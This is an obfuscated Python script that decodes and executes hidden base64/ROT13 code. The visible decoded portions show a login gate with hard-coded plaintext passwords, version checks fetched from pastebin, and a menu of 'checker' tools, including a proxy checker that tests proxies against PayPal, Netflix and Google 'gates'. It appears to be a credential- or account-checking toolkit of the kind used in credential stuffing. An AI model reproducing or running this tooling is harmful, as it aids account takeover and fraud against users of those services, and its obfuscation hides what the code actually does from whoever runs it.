import base64, codecs
magic = 'I0NIRUNLRVIgVUkKaW1wb3J0IG9zLCBzeXMsIHRpbWUKdHJ5OgogaW1wb3J0IHJlcXVlc3RzCmV4Y2VwdDoKICBwcmludCgiIEluc3RhbGxpbmcgcmVxdWVzdHMgTW9kdWxlIikKICBpZiBvcy5uYW1lPT0nbnQnOgogICAgdHJ5OgogICAgICBvcy5zeXN0ZW0oJ3BpcDMgaW5zdGFsbCByZXF1ZXN0cycpCiAgICBleGNlcHQ6CiAgICAgIHByaW50ICgiSW5zdGFsbCBQeXRob24tUGlwIFNpciIpCiAgICAgIHJhd19pbnB1dCgnJykKICBlbHNlOgogICAgb3Muc3lzdGVtKCdwaXAzIGluc3RhbGwgcmVxdWVzdHMnKQoKdHJ5OgogZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZQpleGNlcHQ6CiAgcHJpbnQoIiBJbnN0YWxsaW5nIGNvbG9yYW1hIE1vZHVsZSIpCiAgaWYgb3MubmFtZT09J250JzoKICAgIHRyeToKICAgICAgb3Muc3lzdGVtKCdwaXAzIGluc3RhbGwgY29sb3JhbWEnKQogICAgZXhjZXB0OgogICAgICBwcmludCAoIkluc3RhbGwgUHl0aG9uLVBpcCBTaXIiKQogICAgICByYXdfaW5wdXQoJycpCiAgZWxzZToKICAgIG9zLnN5c3RlbSgncGlwMyBpbnN0YWxsIGNvbG9yYW1hJykKCnZpdmVzbj1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9wV3Z6NmtrcycpLnRleHQKCnZlcnM9cmVxdWVzdHMuZ2V0KCdodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvNnV0TExLNmgnKS50ZXh0CgpncmF0aXM9cmVxdWVzdHMuZ2V0KCJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvTUZueFI5ZG0iKS50ZXh0CmlmIHN5cy52ZXJzaW9uX2luZm9bMF0gPCAzOgogIGlucHV0ID0gcmF3X2lucHV0CmVsc2U6CiAgcmF3X2lucHV0ID0gaW5wdXQKCmNyZWRpdG9zPTEwMAp3aGlsZSBUcnVlOgoKICAgIAogICAgbmFtZSA9IHJhd19pbnB1dCgnSW5ncmVzZSBzdSBub21icmUgZGUgdXN1YXJpbzogJykKICAgIGlmIG5hbWUgIT0gJ0VtaWxpbycgYW5kIG5hbWUgIT0gJ0VtbWFudWVsJyBhbmQgbmFtZSAhPSAndXNyNTI0JyBhbmQgbmFtZSAhPSAndXNyMTYyJyBhbmQgbmFtZSAhPSAnYm9ndGVzdGVyJyBhbmQgbmFtZSAhPSAnc2FtJyBhbmQgbmFtZSAhPSAnY2hrZ3JhdGlzJzoKICAgICAgICBwcmludCAoJ3VzdWFyaW8gaW5jb3JyZWN0bycpCiAgICBlbHNlOgogICAgICAgIGlmIG5hbWUgPT0gJ0VtaWxpbyc6CiAgICAgICAgICAgICAgICBwYXN3X0VtaWxpbyA9IHJhd19pbnB1dCgnSW5ncmVzZSBzdSBwYXNzd29yZDogJykKICAgICAgICAgICAgICAgIGlmIHBhc3dfRW1pbGlvICE9ICdBZTEydmNobCc6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCdQYXNzd29yZCBpbmNvcnJlY3RhJykKICAgICAgICAgICAgICAgICAgICBjcmVkaXRvcy09MQogICAgICAgICAgICAgICAgICAgIGlmIGNyZWRpdG9zPT0wOgogICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICBleGl0KCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCdCaWVudmVuaWRvIExJREVSISAnKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZWxpZiBuYW1lID09ICdFbW1hbnVlbCc6CiAgICAgICAgICAgICAgICBwYXN3X0VtbWFudWVsID0gcmF3X2lucHV0KCdJbmdyZXNlIHN1IHBhc3N3b3JkOiAnKQogICAgICAgICAgICAgICAgaWYgcGFzd19FbW1hbnVlbCAhPSAncm9uYWxkaXRvMSc6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCdQYXNzd29yZCBpbmNvcnJlY3RhJykKICAgICAgICAgICAgICAgICAgICBjcmVkaXRvcy09MQogICAgICAgICAgICAgICAgICAgIGlmIGNyZWRpdG9zPT0wOgogICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICBleGl0KCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCdCaWVudmVuaWRvIGEgTElERVInKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZWxpZiBuYW1lID09ICdib2d0ZXN0ZXInOgogICAgICAgICAgICAgICAgcGFzd19DYWNhID0gcmF3X2lucHV0KCdJbmdyZXNhIGxhIFBhc3N3b3JkOiAnKQogICAgICAgICAgICAgICAgaWYgcGFzd19DYWNhICE9ICd0ZWFtYm9nJzoKICAgICAgICAgICAgICAgICAgcHJpbnQoJ1Bhc3N3b3JkIGluY29ycmVjdGEnKQogICAgICAgICAgICAgICAgICBleGl0KCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgIHByaW50KCdCaWVudmVuaWRvIEFETUlOJykKICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICBlbGlmIG5hbWUgPT0gJ3NhbSc6CiAgICAgICAgICAgICAgICBwYXN3X0NhY2EgPSByYXdfaW5wdXQoJ0luZ3Jlc2EgbGEgUGFzc3dvcmQ6ICcpCiAgICAgICAgICAgICAgICBpZiBwYXN3X0NhY2EgIT0gJ3JpdWsnOgogICAgICAgICAgICAgICAgICBwcmludCgnUGFzc3dvcmQgSU5DT1JSRUNUQSAnKQogICAgICAgICAgICAgICAgICBleGl0KCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgIHByaW50KCdCaWVudmVuaWRvIEFETUlOJykKICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICBlbGlmIG5hbWUgPT0gJ3VzcjE2Mic6CiAgICAgICAgICAgICAgICBwYXN3X0NhY2EgPSByYXdfaW5wdXQoJ0luZ3Jlc2EgbGEgUGFzc3dvcmQ6ICcpCiAgICAgICAgICAgICAgICBpZiBwYXN3X0NhY2EgIT0gJ2hhdm9rMjU2JzoKICAgICAgICAgICAgICAgICAgcHJpbnQoJ1Bhc3N3b3JkIElOQ09SUkVDVEEgJykKICAgICAgICAgICAgICAgICAgZXhpdCgpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICBwcmludCgnQmllbnZlbmlkbyBTaXInKSAKICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICBlbGlmIG5hbWUgPT0gJ3VzcjUyNCc6CiAgICAgICAgICAgICAgICBwYXN3X0NhY2EgPSByYXdfaW5wdXQoJ0luZ3Jlc2EgbGEgUGFzc3dvcmQ6ICcpCiAgICAgICAgICAgICAgICBpZiBwYXN3X0NhY2EgIT0gJ2Rvb20yNTInOgogICAgICAgICAgICAgICAgICBwcmludCgnUGFzc3dvcmQgSU5DT1JSRUNUQSAnKQogICAgICAgICAgICAgICAgICBleGl0KCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgIHByaW50KCdCaWVudmVuaWRvJykKICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICBlbGlmIG5hbWUgPT0gJ2Noa2dyYXRpcyc6CiAgICAgICAgICAgICAgICBwYXN3X0NhY2EgPSByYXdfaW5wdXQoJ0luZ3Jlc2EgbGEgUGFzc3dvcmQ6ICcpCiAgICAgICAgICAgICAgICBpZiBwYXN3X0NhY2EgIT0gJ2dyYXRpcyc6CiAgICAgICAgICAgICAgICAgIHByaW50KCdQYXNzd29yZCBJTkNPUlJFQ1RBJykKICAgICAgICAgICAgICAgICAgZXhpdCgpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICBpZiBncmF0aXM9PScyNDYwNic6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIkJpZW52ZW5pZG8iKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIkxhIEN1ZW50YSBhaCBleHBpcmFkbyIpCiAgICAgICAgICAg'
love = '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'
god = 'bGl4CjQtQ3VzdG9tIAonJycpCgogIGdhdGVzPSBpbnB1dCgiR2F0ZTogIikKICBpZiBnYXRlcz09IjEiOgogICAgZ2F0b3M9Imh0dHBzOi8vZ29vZ2xlLmNvbS8iCiAgICBib25pdG89Ikdvb2dsZSIKICBlbGlmIGdhdGVzPT0iMiI6CiAgICBnYXRvcz0iaHR0cHM6Ly9wYXlwYWwuY29tLyIKICAgIGJvbml0bz0iUGF5UGFsIgogIGVsaWYgZ2F0ZXM9PSIzIjoKICAgIGdhdG9zPSJodHRwczovL25ldGZsaXguY29tLyIKICAgIGJvbml0bz0iTmV0ZmxpeCIKICBlbGlmIGdhdGVzPT0iNCI6CiAgICBwcmludCgiQ3VzdG9tIEdhdGVcbiIpCiAgICBwcmludCgiRXg6IFtodHRwczovL2V4YW1wbGUuY29tL10iKQogICAgZ2F0b3MgPSBpbnB1dCgiTGluazogIikKICAgIGJvbml0bz0iQ3VzdG9tIgogIGVsc2U6CiAgICBnYXRvcz0iaHR0cHM6Ly9jeWJlcnNzaC5jb20vIgogICAgcHJpbnQoImludmFsaWQgW1VTSU5HIEFVWElMSUFSWSBHQVRFXSIpCiAgICBib25pdG89IlNTSCIKICAKICBjbGFzcyBQcm94eUNoZWNrZXIoKToKICAgICMgQ2hlY2sgaWYgcHJveHkgaXMgd29ya2luZwogICAgICBkZWYgY2hlY2tQcm94eShzZWxmLCBwdHlwZSwgcHJveHlpcCk6CiAgICAgICAgICBpZiBwdHlwZSA9PSAiaHR0cHMiOgogICAgICAgICAgICAgIHByb3h5ID0geyJodHRwcyI6ICJodHRwczovLyIgKyBwcm94eWlwfQogICAgICAgICAgZWxpZiBwdHlwZSA9PSAiaHR0cCI6CiAgICAgICAgICAgICAgcHJveHkgPSB7Imh0dHBzIjogImh0dHBzOi8vIiArIHByb3h5aXB9CiAgICAgICAgICBlbGlmIHB0eXBlID09ICJzb2NrczUiOgogICAgICAgICAgICAgIHByb3h5ID0geyJodHRwIjogInNvY2tzNTovLyIgKyBwcm94eWlwLCAiaHR0cHMiOiAic29ja3M1aDovLyIgKyBwcm94eWlwfQogICAgICAgICAgZWxpZiBwdHlwZSA9PSAic29ja3M0IjoKICAgICAgICAgICAgICBwcm94eSA9IHsiaHR0cCI6ICJzb2NrczQ6Ly8iICsgcHJveHlpcCwgImh0dHBzIjogInNvY2tzNDovLyIgKyBwcm94eWlwfQoKICAgICAgICAgIFNlc3Npb24gPSByZXF1ZXN0cy5TZXNzaW9uKCkKICAgICAgICAgIHJlc3BvbnNlID0gU2Vzc2lvbi5nZXQoZ2F0b3MsIHByb3hpZXM9cHJveHksIHRpbWVvdXQ9NSkKICAgICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICByZXR1cm4gcHR5cGUKICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgcmV0dXJuICIiCgogICAgIyBWYWxpZGF0ZSBwcm94eSB0eXBlCiAgICAgIGRlZiB2ZXJpZnlQcm94eShzZWxmLCBwcm94eSk6CiAgICAgICAgICBwcm94eV90eXBlID0gIkludmFsaWQiCiAgICAgICAgICBwcm94eSA9IHByb3h5LnJlcGxhY2UoIiAiLCAiIikKICAgICAgICAgIHByb3h5ID0gcHJveHkucmVwbGFjZSgiXG4iLCAiIikKICAgICAgICAgIHByaW50KEZvcmUuQ1lBTisiQ0hFQ0tJTkc6IHt9Ii5mb3JtYXQocHJveHkpKQoKICAgICAgICAgIHRyeToKICAgICAgICAgICAgICBwcm94eV90eXBlID0gc2VsZi5jaGVja1Byb3h5KCJzb2NrczUiLCBwcm94eSkKICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgIHByb3h5X3R5cGUgPSBzZWxmLmNoZWNrUHJveHkoInNvY2tzNCIsIHByb3h5KQogICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgcHJveHlfdHlwZSA9IHNlbGYuY2hlY2tQcm94eSgiaHR0cHMiLCBwcm94eSkKICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgIHByb3h5X3R5cGUgPSBzZWxmLmNoZWNrUHJveHkoImh0dHAiLCBwcm94eSkKICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICBpZiBwcm94eV90eXBlICE9ICJJbnZhbGlkIjoKICAgICAgICAgICAgICBwcmludChGb3JlLkdSRUVOKyJMaXZlISB7fSBHYXRlID0+IHt9ID0+ICNCb0dfQ0hLXG4iLmZvcm1hdChwcm94eSwgYm9uaXRvKSkKICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQrIkRlYWQge30gR2F0ZSA9PiB7fSA9PiAjQm9HX0NIS1xuIi5mb3JtYXQocHJveHksIGJvbml0bykpCgogICAgICBkZWYgY2hlY2tMaXN0KHNlbGYpOgogICAgICAgICAgd2l0aCBvcGVuKCcuL3Byb3hpZXMudHh0JywgJ3InKSAgIGFzIGY6CiAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gZjoKICAgICAgICAgICAgICAgICAgc2VsZi52ZXJpZnlQcm94eShsaW5lKQoKCiAgY2hlY2tlciA9IFByb3h5Q2hlY2tlcigpCiAgY2hlY2tlci5jaGVja0xpc3QoKQplbGlmIG51bWNoaz09IjMiOgogIGltcG9ydCByZXF1ZXN0cwogIGltcG9ydCBkYXRldGltZQogIGZyb20gY29sb3JhbWEgaW1wb3J0IEZvcmUKICBpbXBvcnQgdGhyZWFkaW5nCiAgaW1wb3J0IHN5cwogIGltcG9ydCB0aW1lCgogIGRlZiBlc2NycChzKToKICAgICAgICAgIGZvciBjIGluIHMgKyAnXG4nOgogICAgICAgICAgICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGMpCiAgICAgICAgICAgICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDEwLiAvIDEwMCkKCgogIGdsb2JhbCBjb3VudAogIGNvdW50ID0gMAogIGNscygpCiAgcHJpbnQoJycnCgogICAgKSAgICAgICAgICggICAgICAgICAgICggICAgIAogKCAvKCAgICggICAgIClcICkgICAgICAgIClcICkgIAogKVwoKSkgIClcICAgKCgpLyggICAoICAgKCgpLyggIAooKF8pXCgoKChfKSggIC8oXykpICApXCAgIC8oXykpIAogXygoXykpXCBfIClcKF8pKV8gICgoXykgKF8pKSAgIAp8IHx8IHwoXylfXChfKXwgICBcIHwgX198LyBfX3wgIAp8IF9fIHwgLyBfIFwgIHwgfCkgfHwgX3wgXF9fIFwgIAp8X3x8X3wvXy8gXF9cIHxfX18vIHxfX198fF9fXy8gIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICBIVFRQIFByb3h5IENoZWNrZXIgCiAgICAgICAgCjEtR29vZ2xlCjItUGF5cGFsW0JFU1RdCjMtTmV0ZmxpeAo0LUN1c3RvbSAKJycnKQoKICBmaWxlID0gaW5wdXQoJ0VudGVyIG5hbWUgb2YgZmlsZSB3aXRoIHByb3hpZXM6ICcpCiAgZ2F0ZXM9IGlucHV0KCJHYXRlOiAiKQogIGlmIGdhdGVzPT0iMSI6CiAgICBnYXRvcz0iaHR0cHM6Ly9nb29nbGUuY29tLyIKICBlbGlmIGdhdGVzPT0iMiI6CiAgICBnYXRvcz0iaHR0cHM6Ly9wYXlwYWwuY29tLyIKCiAgZWxpZiBnYXRlcz09IjMiOgogICAgZ2F0b3M9Imh0dHBzOi8vbmV0ZmxpeC5jb20vIgoKICBlbGlmIGdhdGVzPT0iNCI6CiAgICBwcmludCgiQ3VzdG9tIEdhdGVcbiIpCiAgICBwcmludCgiRXg6IFtodHRwczovL2V4YW1wbGUuY29tL10iKQogICAgZ2F0b3MgPSBpbnB1dCgiTGluazogIikKICBlbHNlOgogICAgZ2F0b3M9Imh0dHBzOi8vY3liZXJzc2guY29tLyIKICAgIHByaW50KCJpbnZhbGlkIFtVU0lORyBBVVhJTElBUlkgR0FURV0iKQoKICBp'
destiny = 'MvNaYaE4qPptnJ4tMzyfMGbXVPNtVPNto2McoTHtCFOznJkyPvNtMJkmMGbXVPNtVPNto2McoTHtCFOznJkyVPftWl50rUDaPtbtVUqcqTtto3OyovuiMzyfMFjapvpcVTSmVUOlo3u5MzyfMGbXVPNtVPNtpUWirTyyplN9VUOlo3u5MzyfMF5lMJSxoTyhMKZbXDbtVPNtVPOuoJ91oaDtCFOfMJ4bpUWirTyyplxXPvNtMKAwpaNbEz9lMF5QJHSBVPftW0WCElOGEHAIHxyHJFNgVRuHISNiHlODHx9LJFOQFRIQF0IFWlxXPvNtMTIzVTAbMJAeK3Olo3ucMKZbpUWirUxfLJ1iqJ50XGbXVPNtVPNtM2kiLzSfVTAiqJ50PvNtVPNtVUOlo3u5VQ0tpUWirUxhp3ElnKNbXDbtVPNtVPOjpz94rHEcL3DtCFO7VNbtVPNtVPNtVPWbqUEjplVtBvOjpz94rDbtVPNtsDbtVPNtVPOmqTSlqPN9VTEuqTI0nJ1yYzEuqTI0nJ1yYz5iqltcPvNtVPNtVUElrGbXPtbtVPNtVPNtVPNtpzImVQ0tpzIkqJImqUZhM2I0XUIloQ1aLKEiplkjpz94nJImCKOlo3u5ETywqPk0nJ1yo3I0CGHcPvNtVPNtVPNtVPOcMvOlMKZhp3EuqUImK2AiMTHtCG0tZwNjBtbtVPNtVPNtVPNtVPNtVTIhMPN9VTEuqTI0nJ1yYzEuqTI0nJ1yYz5iqltcPvNtVPNtVPNtVPNtVPNtpzS3K3AjMJIxVQ0tp3ElXTIhMP1mqTSlqPxhp3OfnKDbWl4aXIfkKDbtVPNtVPNtVPNtVPNtVUAjMJIxK2yhqPN9VUWiqJ5xXTyhqPulLKqsp3OyMJDcYQVcPvNtVPNtVPNtVPNtVPNtp3OyMJDtCFOlo3IhMPumpTIyMS9coaDiZGNjZPxXPvNtVPNtVPNtVPNtVPAjpzyhqPO3o3WenJ5aVUOlo3ucMKZtLJ5xVUEbMJylVUAjMJIxPtbtVPNtVPNtVPNtVPNtVUOlo3u5K2yhMz8tCFOzW3gjpz94rK0tYFO7p3OyMJE9oKZtCG4tDz9UK0AVFlpXVPNtVPNtVPNtVPNtVPOjpzyhqPuTo3WyYxqFEHIBVPftpUWirUysnJ5zolxXVPNtVPNtVPNtVPNtPvNtVPNtVPNtVPNtVPNtL291oaDtXm0tZDbtVPNtVPNtVPNtVPNXVPNtVPNtVPNtVPNtVPNXPvNtVPNtVPNtVPNtVNbXVPNtVPNtMKuwMKO0BtbtVPNtVPNtVPNtL291oaDtXm0tZDbtVPNtVPNtVNbtVPNtVPNtVPNtpTSmpjbXPvNtMz9lVUOlo3u5VTyhVUOlo3ucMKZ6PvNtVPNtVUEbpzIuMTyhMl5HnUWyLJDbqTSlM2I0CJAbMJAeK3Olo3ucMKZbpUWirUxfLJ1iqJ50XFxhp3EupaDbXDcyoTyzVT51oJAbnm09VwDvBtbtVTygpT9lqPOipjbtVTygpT9lqPOmoKEjoTyvPtbtVTEyMvOcozy6nJSfMFtcBtbtVPNtL2kmXPxXVPNtVUOlnJ50XPVvVtbtVPNtVPNtVPNtXNbtVPNtVPNtK18hYvysKjbtVPNtVP4aVPNtVPNtVTNaYtbtVPNtXPNgVP0tVPNtVPNtVTNcPvNtVPtbWlxbWlxtVPNtVPNtVPNcPvNtVP8tVS4tVPNtVPNtVPxtVPO8PvNtVSjhYF0hVPNtVPNtVPNtVPO8PvNtVPOpYF0aVPNtVPNtVPNtVP8XVPNtVPOpK18hYFptK18hYvpaPvNtVPNtVPNiVPNtVPO8PvNtVvVvXDbtVPNtqUyjMKAwpvtvDx9UVRqADHyZVRAVEHAYEIVvXDbtVTyhnKccLJkyXPxXVPOwo250VQ0tZNbtVUA1L2ZtCFNjPvNtMTylMJ1u